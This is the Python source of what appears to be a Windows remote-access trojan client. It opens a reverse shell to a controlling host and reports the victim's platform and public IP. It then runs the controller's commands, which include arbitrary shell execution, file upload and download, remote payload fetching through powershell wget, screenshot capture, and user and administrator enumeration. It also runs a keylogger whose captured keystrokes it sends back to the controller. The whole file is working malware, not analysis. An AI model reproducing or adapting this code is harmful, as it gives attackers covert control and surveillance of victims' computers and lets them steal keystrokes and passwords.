import subprocess, socket, platform, os, datetime
import PIL.ImageGrab
import keyLogger, update
from threading import Thread
from urllib2 import urlopen

class functions(object):
    host = ""
    port = ""
    crypto = None

    logger = keyLogger.keyLogger()
    updater = update.Update()

    threadLogger = None
    threadMain = None

    running = False

    def __init__(self,host,port):
        self.host = host
        self.port = port

    def start(self):
        self.threadMain = Thread(target=self.shell, name="Main")
        self.threadMain.start()
        self.threadMain.join()
        return self.running

    def shell(self):
        try:
            self.running = True
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((self.host, self.port))
            soc.send("Conected to " + platform.platform() + " with ip " + urlopen('http://ip.42.pl/raw').read() + "\n")
            while (1):
                data = soc.recv(1024)
                if data.startswith("quit\n"):
                    break

                elif data == "version\n":
                    version = self.updater.getVersion()
                    soc.send(version + "\n")

                elif data.startswith("getFile("):
                    url = data[8:-2]
                    names = url.split("/")
                    name = names[len(names) - 1]
                    # pwd
                    command = "cd"
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    pwd = proc.stdout.read() + proc.stderr.read()
                    pwd = pwd.replace(" ", "%20")

                    soc.send(name + " downloading...\n")

                    # download
                    command = "powershell wget \"" + url + "\" -outfile \"" + name + "\""
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout = None
                    stdout = proc.stdout.read() + proc.stderr.read()

                    if stdout is not None:
                        soc.send(stdout)
                    else:
                        soc.send(name + "downloaded successfully.\n")

                    """#print
                    command = "powershell write-host \"" + pwd + "\""
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()

                    soc.send(stdout)"""

                elif data == "screenshot\n":
                    date = datetime.datetime.now().strftime("%Y-%m-%d %H%M%S")
                    screen = PIL.ImageGrab.grab()
                    screen.save(str(str(date) + '.png'), 'png')
                    soc.send("screen " + date + ".png created")
                    # sending file
                    with open(str(str(date) + '.png'), "rb") as imageFile:
                        # Image_Str = base64.b64encode(imageFile.read())
                        Image_Str = imageFile.read()
                    fh = open("text", "wb")
                    fh.write(Image_Str)
                    fh.close
                    fh = open("text", "rb")
                    str1 = fh.read(150)
                    soc.send(str1)
                    while str1:
                        str1 = fh.read(150)
                        soc.sendall(str1)
                    soc.sendall("6finish")

                    fh.close()
                    os.remove("text")
                    os.remove(str(str(date) + '.png'))

                elif data.startswith("download("):
                    name = data[9:-2]
                    if os.path.isfile(name):
                        soc.send("Downloading " + name + "...")

                        with open(name, "rb") as file:
                            # Image_Str = base64.b64encode(imageFile.read())
                            File_Str = file.read()
                        fh = open("text", "wb")
                        fh.write(File_Str)
                        fh.close
                        fh = open("text", "rb")
                        str1 = fh.read(150)
                        soc.send(str1)
                        while str1:
                            str1 = fh.read(150)
                            soc.sendall(str1)
                        soc.sendall("6finish")

                        fh.close()
                        os.remove("text")
                    else:
                        soc.send(name + " does not exists.")

                elif data.startswith("upload("):
                    name = data[7:-2]
                    soc.send("ok")
                    data = ""
                    data = soc.recv(4096)
                    while "finish" not in data:
                        data += soc.recv(150)
                    data = data[:-7]

                    fh = open(name, "wb")
                    fh.write(data)
                    fh.close()
                    # print name + " successfully downloaded."

                elif data.startswith("cdir"):
                    path = data[5:-1]
                    os.chdir(path)
                    soc.send(os.getcwd() + "\n")

                elif data == "pwd\n":
                    soc.send(os.getcwd() + "\n")

                elif data == "ls\n":
                    proc = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()
                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

                elif data == "admins\n":
                    proc = subprocess.Popen("net localgroup administrators", shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()

                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

                elif data == "users\n":
                    proc = subprocess.Popen("net user", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()

                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

                elif data.startswith("run "):
                    prog = data[4:len(data) - 1]
                    stdout = prog
                    if os.path.isfile(prog):
                        stdout = "Running " + prog + "..."
                        proc = subprocess.Popen(prog, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)

                        stdout = proc.stdout.read() + proc.stderr.read()
                    else:
                        stdout = "File not found!!!"

                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

                elif data == "keylogger start\n":
                    if self.threadLogger is None:
                        self.threadLogger = Thread(target=self.logger.start, name="KeyLogger")
                        self.threadLogger.start()
                        soc.send("Keylogger started...\n")
                    else:
                        soc.send("Keylogger already running...\n")

                elif data == "keylogger stop\n":
                    if self.threadLogger is not None:
                        self.threadLogger = None
                        self.logger.stop()
                        soc.send("Keylogger stoped...\n")
                    else:
                        soc.send("Keylogger is not running...\n")

                elif data == "keylogger status\n":
                    if self.threadLogger is not None:
                        soc.send("Keylogger is running...\n")
                    else:
                        soc.send("Keylogger is not nunning...\n")

                elif data == "keylogger get\n":
                    if os.path.isfile('output.txt'):
                        f = open('output.txt', 'r+')
                        buffer = f.read()
                        f.close()
                        soc.send(buffer)

                        os.remove('output.txt')
                    else:
                        soc.send("No data from keylogger...\n")

                elif data == "whelp\n":
                    proc = subprocess.Popen("help", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()

                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

                elif data == "stop\n":
                    soc.send("Connection terminated.\n")
                    soc.close()
                    if self.threadLogger is not None:
                        del self.threadLogger
                    self.running = False

                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)

                    stdout = proc.stdout.read() + proc.stderr.read()
                    if stdout == '':
                        soc.send(' ')
                    else:
                        soc.send(stdout)

            soc.send("Connection terminated.\n")
            soc.close()
            self.running = False
        except:
            self.running = False


